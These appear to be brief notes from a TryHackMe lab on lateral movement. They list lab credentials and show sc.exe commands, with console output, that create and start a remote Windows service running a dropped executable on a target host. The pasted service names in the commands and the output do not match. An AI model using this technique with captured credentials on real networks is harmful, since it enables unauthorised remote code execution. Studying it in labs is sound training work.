# Lateral Movement and Pivoting

Credentials

```
Username: amelia.williams Password: Dogman2002
```

For this exercise, we will assume we have already captured some credentials with administrative access:

```
User: ZA.TRYHACKME.COM\t1_leonard.summers

Password: EZpass4ever
```

```
sc.exe \\thmiis.za.tryhackme.com create JSservice-3249 binPath= "%windir%\jsservice.exe" start= auto
```

```
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-1115 binPath= "%windir%\jsservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create JSservice-3249 binPath= "%windir%\jsservice.exe" start= auto
[SC] CreateService SUCCESS
```

```
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-1115
sc.exe \\thmiis.za.tryhackme.com start JSservice-3249
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
